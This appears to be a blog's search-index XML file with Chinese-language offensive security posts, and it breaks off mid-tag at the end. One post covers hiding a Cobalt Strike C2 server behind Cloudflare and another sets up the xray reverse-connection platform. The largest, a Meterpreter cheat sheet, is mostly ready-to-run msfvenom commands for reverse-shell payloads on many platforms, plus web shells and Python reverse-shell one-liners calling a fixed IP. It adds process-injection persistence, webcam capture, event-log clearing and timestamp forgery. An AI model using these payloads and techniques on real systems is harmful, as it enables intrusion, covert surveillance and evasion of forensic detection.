<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>域名/DNS 配置</title>
      <link href="2021/05/27/yu-ming-dns-pei-zhi/"/>
      <url>2021/05/27/yu-ming-dns-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="域名-DNS-相关配置"><a href="#域名-DNS-相关配置" class="headerlink" title="域名/DNS 相关配置"></a>域名/DNS 相关配置</h1><span id="more"></span><h2 id="1-域名-DNS配置"><a href="#1-域名-DNS配置" class="headerlink" title="1 域名/DNS配置"></a>1 域名/DNS配置</h2><h3 id="1-1注册google-邮箱"><a href="#1-1注册google-邮箱" class="headerlink" title="1.1注册google 邮箱"></a>1.1注册google 邮箱</h3><p>需要提前注册好，这里不做过多描述</p><h3 id="1-2注册免费域名"><a href="#1-2注册免费域名" class="headerlink" title="1.2注册免费域名"></a>1.2注册免费域名</h3><p>地址：<a href="https://my.freenom.com/">https://my.freenom.com/</a></p><p>下图几个域名后缀为免费域名</p><img src="/2021/05/27/yu-ming-dns-pei-zhi/img-1.png" class="slug"><p>这里需要先把vpn改到全局代理，然后注册域名，注册完以后需要先修改用户信息，再去付款，最高可以选择一年，然后去goole邮箱激活</p><h3 id="1-3注册登录免费CDN"><a href="#1-3注册登录免费CDN" class="headerlink" title="1.3注册登录免费CDN"></a>1.3注册登录免费CDN</h3><p>地址：<a href="https://dash.cloudflare.com/">https://dash.cloudflare.com/</a></p><img src="/2021/05/27/yu-ming-dns-pei-zhi/img-2.png" class="slug"><p>注册完后，输入子域名</p><img src="/2021/05/27/yu-ming-dns-pei-zhi/img-3.png" class="slug"><p>将ns地址填入</p><img src="/2021/05/27/yu-ming-dns-pei-zhi/img-4.png" class="slug"><p>即可</p><p>参考：<a href="https://mp.weixin.qq.com/s/S_REwcYlJGpyiJb3PIwsOQ">https://mp.weixin.qq.com/s/S_REwcYlJGpyiJb3PIwsOQ</a></p><p><a href="https://zhujitips.com/328">https://zhujitips.com/328</a></p><h2 id="2-C2服务器隐藏"><a href="#2-C2服务器隐藏" class="headerlink" title="2 C2服务器隐藏"></a>2 C2服务器隐藏</h2><p>链接cs服务端，在这之后新建一个监听器为 http 的，然后 Hosts 和 Beacons 都设置为域名：</p><img src="/2021/05/27/yu-ming-dns-pei-zhi/img-5.png" class="slug"><p>注意 http port 端口只能设置成以下几个：</p><pre class="line-numbers language-none"><code class="language-none">80,8080,8880,2052,2082,2086,2095<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果是 https 的监听端口只能设置成以下几个：</p><pre class="line-numbers language-none"><code class="language-none">443,2053,2083,2087,2096,8443;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为这是 Cloudflare 仅支持的端口，所以没办法把监听器设置成其他端口。</p><p>尝试上线</p><img src="/2021/05/27/yu-ming-dns-pei-zhi/img-6.png" class="slug">]]></content>
      
      
      
        <tags>
            
            <tag> 配置 </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xray 反连平台搭建</title>
      <link href="2021/05/20/xray-fan-lian-ping-tai-da-jian/"/>
      <url>2021/05/20/xray-fan-lian-ping-tai-da-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="Xray-反连平台搭建"><a href="#Xray-反连平台搭建" class="headerlink" title="Xray 反连平台搭建"></a>Xray 反连平台搭建</h1><span id="more"></span><h2 id="1-简单介绍"><a href="#1-简单介绍" class="headerlink" title="1. 简单介绍"></a>1. 简单介绍</h2><p>xray是一款功能强大的安全评估工具,支持常见web漏洞的自动化检测,可以在 Github兔费下载使用(不开源)</p><h2 id="2-下载"><a href="#2-下载" class="headerlink" title="2. 下载"></a>2. 下载</h2><p><a href=https://download.xray.cool/>国内下载_地址</a></p><p><a href=https://github.com/chaitin/xray>github地址</a></p><p><a href=https://docs.xray.cool/#/tutorial/prepare>使用手册</a></p><p>其他功能和特点暂不做介绍，本文仅阐述反连平台搭建</p><h2 id="3-反连平台搭建"><a href="#3-反连平台搭建" class="headerlink" title="3. 反连平台搭建"></a>3. 反连平台搭建</h2><h3 id="3-1-准备"><a href="#3-1-准备" class="headerlink" title="3.1 准备"></a>3.1 准备</h3><p>可自定义DNS host的域名 \n</p><p>一台VPS</p><h3 id="3-2-VPS-配置"><a href="#3-2-VPS-配置" class="headerlink" title="3.2 VPS 配置"></a>3.2 VPS 配置</h3><p>开放UDP 53 端口 （此处必须为UDP协议，默认为TCP协议，注意避坑）<br>开放TCP 10001 端口 </p><h3 id="3-3-域名解析配置"><a href="#3-3-域名解析配置" class="headerlink" title="3.3 域名解析配置"></a>3.3 域名解析配置</h3><p>增加ns1/ns2 解析到VPS</p><img src="/2021/05/20/xray-fan-lian-ping-tai-da-jian/img.png" class="slug"><h3 id="3-4-Xray-server-配置"><a href="#3-4-Xray-server-配置" class="headerlink" title="3.4 Xray-server 配置"></a>3.4 Xray-server 配置</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">reverse:  db_file_path: &quot;reverse.db&quot;   # 反连平台数据库文件位置, 这是一个 KV 数据库  token: &quot;你的密码&quot; # 反连平台认证的 Token, 独立部署时不能为空  http:    enabled: true    listen_ip: 0.0.0.0     listen_port: &quot;10001&quot;    ip_header: &quot;&quot;                         dns:    enabled: true    listen_ip: 0.0.0.0     domain: &quot;example.com&quot;  # DNS 域名配置    is_domain_name_server: false        resolve:                            # DNS 静态解析规则    - type: A                           # A, AAAA, TXT 三种      record: ns1      value: xxx.xx.xx.xx      ttl: 60    - type: A                           # A, AAAA, TXT 三种      record: ns2      value: xxx.xxx.xxx.xxx      ttl: 60      <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-测试"><a href="#4-测试" class="headerlink" title="4. 测试"></a>4. 测试</h2><p>登录VPS</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">.&#x2F;xray_linux_amd64 reverse  #启动<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问listen_port对应端口<br><img src="img_1.png" alt="img_1.png"><br>输入token信息认证，参照使用说明进行验证<br>如下图，获取了当前用户的whoami信息<br><img src="img_2.png" alt="img_2.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Msfvenmon常用命令/Meterpreter后渗透常用命令</title>
      <link href="2021/05/01/msfvenmon-chang-yong-ming-ling-meterpreter-hou-shen-tou-chang-yong-ming-ling/"/>
      <url>2021/05/01/msfvenmon-chang-yong-ming-ling-meterpreter-hou-shen-tou-chang-yong-ming-ling/</url>
      
        <content type="html"><![CDATA[<h1 id="Meterpreter后渗透常用命令"><a href="#Meterpreter后渗透常用命令" class="headerlink" title="Meterpreter后渗透常用命令"></a>Meterpreter后渗透常用命令</h1><span id="more"></span><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h2><p>Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统，在远程主机上隐藏自己，它不改变系统硬盘中的文件，因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的，所以跟踪它或者终止它对于一个有经验的人也会变得非常困难</p><h2 id="2-文件目录解析"><a href="#2-文件目录解析" class="headerlink" title="2 文件目录解析"></a>2 文件目录解析</h2><p>核心文件包括data、modules、scripts、tools、plugins</p><h3 id="2-1-data"><a href="#2-1-data" class="headerlink" title="2.1 data"></a>2.1 data</h3><p>该文件常用功能在woldlist 里面</p><h3 id="2-2-modules"><a href="#2-2-modules" class="headerlink" title="2.2 modules"></a>2.2 modules</h3><p>该文件包含了msf最核心的几个文件</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">auxiliary #漏洞辅助模块一般是没有攻击载荷的漏洞攻击Exploit #渗透攻击模块st #开发模块pads #漏洞负载模块Encode #编码模块Nops #空指令模块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-scripts"><a href="#2-3-scripts" class="headerlink" title="2.3 scripts"></a>2.3 scripts</h3><p>该文件夹里面包含各种脚本</p><h3 id="2-4-tools"><a href="#2-4-tools" class="headerlink" title="2.4 tools"></a>2.4 tools</h3><p>该文件夹中存放着大量的使用脚本</p><h3 id="2-5-plugins"><a href="#2-5-plugins" class="headerlink" title="2.5 plugins"></a>2.5 plugins</h3><p>该文件夹放着大量的插件</p><h2 id="3-生成木马模块"><a href="#3-生成木马模块" class="headerlink" title="3 生成木马模块"></a>3 生成木马模块</h2><h3 id="3-1-常用参数"><a href="#3-1-常用参数" class="headerlink" title="3.1 常用参数"></a>3.1 常用参数</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">-p # –payload &lt; payload&gt; 指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的-l # –list [module_type] 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all -n # –nopsled &lt; length&gt; 为payload预先指定一个NOP滑动长度-f # –format &lt; format&gt; 指定输出格式 (使用 –help-formats 来获取msf支持的输出格式列表)-e, #–encoder [encoder] 指定需要使用的encoder(编码器),指定需要使用的编码，如果既没用-e选项也没用-b选项，则输出raw payload -a # –arch &lt; architecture&gt; 指定payload的目标架构，例如x86 | x64 | x86_64-–platform &lt; platform&gt; 指定payload的目标平台-s #–space &lt; length&gt; 设定有效攻击荷载的最大长度，就是文件大小-b, #–bad-chars &lt; list&gt; 设定规避字符集，指定需要过滤的坏字符例如:不使用 &#39;\x0f&#39;、&#39;\x00&#39;; -i # –iterations &lt; count&gt; 指定payload的编码次数-c #–add-code &lt; path&gt; 指定一个附加的win32 shellcode文件-x #–template &lt; path&gt; 指定一个自定义的可执行文件作为模板,并将payload嵌入其中-k #–keep 保护模板程序的动作，注入的payload作为一个新的进程运行 –payload-options 列举payload的标准选项-o # –out &lt; path&gt; 指定创建好的payload的存放位置-v #–var-name &lt; name&gt; 指定一个自定义的变量，以确定输出格式 –shellest 最小化生成payload-h  # –help 查看帮助选项–help-formats #查看msf支持的输出格式列表# ⽐如想查看 windows&#x2F;meterpreter&#x2F;reverse_tcp 支持什什么平台、哪些选项，可以使⽤ msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp --list- options<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-几个重要的监听参数"><a href="#3-2-几个重要的监听参数" class="headerlink" title="3.2 几个重要的监听参数"></a>3.2 几个重要的监听参数</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#防止假session 在实际使用中，会遇到假session 或者刚链接就断开的情况，补充一些参数，防止假死与假session msf exploit(multi&#x2F;handler) &gt; set ExitOnSession false &#x2F;&#x2F;可以在接收到seesion后继续监听端口，保持侦听。#防止session 意外退出msf5 exploit(multi&#x2F;handler) &gt; set SessionCommunicationTimeout 0 &#x2F;&#x2F;默认情况下，如果一个会话将在5分钟(300秒)没有任何活动，那么它会被杀死,为防止此情况可将此项修改为0msf5 exploit(multi&#x2F;handler) &gt; set SessionExpirationTimeout 0 &#x2F;&#x2F;默认情况下，一个星期(604800秒)后，会话将被强制关闭,修改为0可永久不会被关闭<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-3-handler-后台持续监听"><a href="#3-3-handler-后台持续监听" class="headerlink" title="3.3 handler 后台持续监听"></a>3.3 handler 后台持续监听</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msf exploit(multi&#x2F;handler) &gt; exploit -j -z#使⽤用 exploit -j -z 可在后台持续监听,-j为后台任务，-z为成功后不不主动发送stage，使⽤用Jobs命令查看和管理理后台任 务。 jobs -K 可结束所有任务。#快捷建立监听方式msf5 &gt; handler -H 192.177.113.87 -P 4444 -p windows&#x2F;meterpreter&#x2F;reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-4-payload-可持续化"><a href="#3-4-payload-可持续化" class="headerlink" title="3.4 payload 可持续化"></a>3.4 payload 可持续化</h3><p>一般来说使用，msfvenom 生成的payload会单独开启一个进程，这种进程很容易被发现和关闭，在后期想做持久化的时候只能再使用migrate</p><p>通过生成payload时使用如下命令，payload会直接注入指定进程</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -e x86&#x2F;shikata_ga_nai -b &quot;\x00&quot; -i 5 -a x86 --platform win PrependMigrate&#x3D;ture PrependMigrateProc&#x3D;svchost.exe -f exe -o shell.exe #⽣成的shell程序执⾏后会启动两个进程 shell.exe 和 svchost.exe ，关闭其中一个不会影响会话状态。唯一美中不足的是 svchost.exe 不是 system32 目录下的。#1.PrependMigrate&#x3D;true PrependMigrateProc&#x3D;svchost.exe 使这个程序默认会迁移到svchost.exe进程，⾃己测试的时候不不建议到这个进程⽽是其他的持久进程#2.使⽤用-p指定使⽤用的攻击载荷模块，使⽤用-e指定使⽤用x86&#x2F;shikata_ga_nai编码器器，使⽤用-f选项告诉MSF编码器器输出格式为exe，-o选项指定输出的文件名为payload.exe，保存在根目录下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-各平台payload-生成"><a href="#3-2-各平台payload-生成" class="headerlink" title="3.2 各平台payload 生成"></a>3.2 各平台payload 生成</h3><h4 id="3-2-1-windows"><a href="#3-2-1-windows" class="headerlink" title="3.2.1 windows"></a>3.2.1 windows</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -a x86 --platform Windows -f exe &gt;shell.exemsfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f exe &gt;shell.exe#注意：windows下⽣生成32位&#x2F;64位payload时需要注意:以windows&#x2F;meterpreter&#x2F;reverse_tcp为例例，该payload默认为32位，也可使⽤-a x86选项指定。如果要生成64位，则payload为windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-2-2-Linux"><a href="#3-2-2-Linux" class="headerlink" title="3.2.2 Linux"></a>3.2.2 Linux</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -a x86 --platform Linux -f elf &gt;shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-3-Mac"><a href="#3-2-3-Mac" class="headerlink" title="3.2.3 Mac"></a>3.2.3 Mac</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p osx&#x2F;x86&#x2F;shell_reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f -a x86 --platform osx -f macho &gt;shell.macho<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-4-Android"><a href="#3-2-4-Android" class="headerlink" title="3.2.4 Android"></a>3.2.4 Android</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -a dalvik -p android&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f raw &gt;shell.apkmsfvenom -p android&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.177.113.87 R&gt;shell.apk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="3-2-5-Powershell"><a href="#3-2-5-Powershell" class="headerlink" title="3.2.5 Powershell"></a>3.2.5 Powershell</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -a x86 -platform windows -p windows&#x2F;poweshell_reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -e cmd&#x2F;powershell_base -f raw -o shell.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-6-Netcat"><a href="#3-2-6-Netcat" class="headerlink" title="3.2.6 Netcat"></a>3.2.6 Netcat</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#nc 正向链接msfvenom -p windows&#x2F;shell_hidden_bind_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f exe &gt;shell.exe#nc 反向连接msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f exe &gt;shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-2-7-基于Linux的shellcode"><a href="#3-2-7-基于Linux的shellcode" class="headerlink" title="3.2.7 基于Linux的shellcode"></a>3.2.7 基于Linux的shellcode</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -a x86 --platform linux -f c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-8-基于Windows的shellcode"><a href="#3-2-8-基于Windows的shellcode" class="headerlink" title="3.2.8 基于Windows的shellcode"></a>3.2.8 基于Windows的shellcode</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -a x86 --platform windows -f c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-9-基于MAC的shellcode"><a href="#3-2-9-基于MAC的shellcode" class="headerlink" title="3.2.9 基于MAC的shellcode"></a>3.2.9 基于MAC的shellcode</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvemom -p osx&#x2F;x86&#x2F;shell_reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -a x86 --platform osx -f c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-10-Python-反弹shell"><a href="#3-2-10-Python-反弹shell" class="headerlink" title="3.2.10 Python 反弹shell"></a>3.2.10 Python 反弹shell</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p cmd&#x2F;unix&#x2F;reverse_python LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f raw&gt;shell.pymsfvenom -a python -p python&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f raw &gt;shell.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="3-2-11-Python正向shell"><a href="#3-2-11-Python正向shell" class="headerlink" title="3.2.11 Python正向shell"></a>3.2.11 Python正向shell</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#1.python&#x2F;python3 -c python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.177.113.87&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);&#39;#2.python&#x2F;python3 -c &quot;exec(\&quot;import socket, subprocess;s &#x3D; socket.socket();s.connect((&quot;192.177.113.87&quot;,3333))\n while 1: proc &#x3D; subprocess.Popen(s.recv(1024), shell&#x3D;True, stdout&#x3D;subprocess.PIPE, stderr&#x3D;subprocess.PIPE, stdin&#x3D;subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-2-12-Bash"><a href="#3-2-12-Bash" class="headerlink" title="3.2.12 Bash"></a>3.2.12 Bash</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p cmd&#x2F;unix&#x2F;reverse_bash LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f raw &gt; shell.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-13-Perl"><a href="#3-2-13-Perl" class="headerlink" title="3.2.13 Perl"></a>3.2.13 Perl</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p cmd&#x2F;unix&#x2F;reverse_perl LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f raw &gt; shell.pl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-14-Lua"><a href="#3-2-14-Lua" class="headerlink" title="3.2.14 Lua"></a>3.2.14 Lua</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p cmd&#x2F;unix&#x2F;reverse_lua LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f raw &gt; shell.lua<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-15-Ruby"><a href="#3-2-15-Ruby" class="headerlink" title="3.2.15 Ruby"></a>3.2.15 Ruby</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p ruby&#x2F;shell_reverse_tcp LHOST&#x3D;192.177.113.87 LPORT&#x3D;4444 -f raw &gt; shell.rb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-16-Web"><a href="#3-2-16-Web" class="headerlink" title="3.2.16 Web"></a>3.2.16 Web</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#PHPmsfvenom -p php&#x2F;meterpreter_reverse_tcp LHOST&#x3D;10.211.55.2 LPORT&#x3D;3333 -f raw &gt; shell.php cat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php#ASPXmsfvenom -a x86 --platform windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.211.55.2 LPORT&#x3D;3333 -f aspx -o shell.aspx#ASPmsfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.211.55.2 LPORT&#x3D;3333 -f asp &gt; shell.asp#JSPmsfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;10.211.55.2 LPORT&#x3D;3333 -f raw &gt; shell.jsp#WARmsfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;10.211.55.2 LPORT&#x3D;3333 -f war &gt; shell.war#nodejsmsfvenom -p nodejs&#x2F;shell_reverse_tcp LHOST&#x3D;10.211.55.2 LPORT&#x3D;3333 -f raw -o shell.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-系统命令"><a href="#4-系统命令" class="headerlink" title="4 系统命令"></a>4 系统命令</h2><h3 id="4-1-基础系统命令"><a href="#4-1-基础系统命令" class="headerlink" title="4.1 基础系统命令"></a>4.1 基础系统命令</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">search #查找漏洞利用模块use &lt;name&gt; #使用指定模块show options #显示所有配置信息session -s &lt;ID&gt; # 进入会话。- K 杀死会话background  #当前会话放置后台run #执行。run后按下俩下 tab，列出已有脚本info #查看已有模块信息getuid #查看权限getpid #查看当前进程的pidsysinfo #查看目标主机系统信息ps #查看当前活跃进程 kill &lt;PId&gt; 杀死进程idletime #查看目标计算机闲置时间reboot &#x2F; shutdown  #重启&#x2F;关机shell #进入目标 cmd shel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-2-开关键盘-鼠标"><a href="#4-2-开关键盘-鼠标" class="headerlink" title="4.2 开关键盘/鼠标"></a>4.2 开关键盘/鼠标</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">uictl [enable&#x2F;disable] [keyboard&#x2F;mouse&#x2F;all] #开启或禁止键盘&#x2F;鼠标<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-3-摄像头命令"><a href="#4-3-摄像头命令" class="headerlink" title="4.3 摄像头命令"></a>4.3 摄像头命令</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">webcam_list  #查看摄像头webcam_snap   #通过摄像头拍照webcam_stream   #通过摄像头开启视频<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="4-4-执行文件"><a href="#4-4-执行文件" class="headerlink" title="4.4 执行文件"></a>4.4 执行文件</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; execute Usage: execute -f file [options]Executes a command on the remote machine.OPTIONS:    -H        Create the process hidden from view.    -a &lt;opt&gt;  The arguments to pass to the command.    -c        Channelized I&#x2F;O (required for interaction).    -d &lt;opt&gt;  The &#39;dummy&#39; executable to launch when using -m.    -f &lt;opt&gt;  The executable command to run.    -h        Help menu.    -i        Interact with the process after creating it.    -k        Execute process on the meterpreters current desktop    -m        Execute from memory.    -s &lt;opt&gt;  Execute process in a given session as the session user    -t        Execute process with currently impersonated thread token<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-5-进程迁移"><a href="#4-5-进程迁移" class="headerlink" title="4.5 进程迁移"></a>4.5 进程迁移</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; migrateUsage: migrate &lt;&lt;pid&gt; | -P &lt;pid&gt; | -N &lt;name&gt;&gt; [-t timeout]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>例：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">getpid    # 获取当前进程的pidps   # 查看当前活跃进程migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中kill &lt;pid值&gt;   #杀死进程注意 只有相同进程权限的启动程序可以注入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-5-日志清理"><a href="#4-5-日志清理" class="headerlink" title="4.5 日志清理"></a>4.5 日志清理</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">clearev #清除windows中的应用程序日志、系统日志、安全日志，需要管理员权限<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-6-基础文件系统命令"><a href="#4-6-基础文件系统命令" class="headerlink" title="4.6 基础文件系统命令"></a>4.6 基础文件系统命令</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">getwd 或者pwd # 查看当前工作目录  lscdcat c:\\lltest\\lltestpasswd.txt  # 查看文件内容upload &#x2F;tmp&#x2F;hack.txt C:\\lltest  # 上传文件到目标机上download c:\\lltest\\lltestpasswd.txt &#x2F;tmp&#x2F; # 下载文件到本机上edit c:\\1.txt #编辑或创建文件  没有的话，会新建文件rm C:\\lltest\\hack.txtmkdir lltest2  #只能在当前目录下创建文件夹rmdir lltest2  #只能删除当前目录下文件夹getlwd   或者 lpwd   #操作攻击者主机 查看当前目录lcd &#x2F;tmp   #操作攻击者主机 切换目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-7-伪造时间戳"><a href="#4-7-伪造时间戳" class="headerlink" title="4.7 伪造时间戳"></a>4.7 伪造时间戳</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; timestomp c:&#x2F;&#x2F;Usage: timestomp &lt;file(s)&gt; OPTIONSOPTIONS:    -a &lt;opt&gt;  #设置文件的“上次访问”时间    -b        #设置MACE时间戳，使EnCase显示空白    -c &lt;opt&gt;  #设置文件的“创建”时间    -e &lt;opt&gt;  #设置文件的“mft entry modified”时间    -f &lt;opt&gt;  #将属性的MACE设置为与提供的文件相同    -h        Help banner    -m &lt;opt&gt;  #设置文件的“上次写入”时间    -r        #在目录上递归设置MACE时间戳    -v        #显示文件的UTC MACE值    -z &lt;opt&gt;  #设置文件的所有四个属性（MACE）例：timestomp -v C:&#x2F;&#x2F;2.txt   #查看时间戳timestomp C:&#x2F;&#x2F;2.txt -f C:&#x2F;&#x2F;1.txt #将1.txt的时间戳复制给2.txt<span aria-hidden="true" 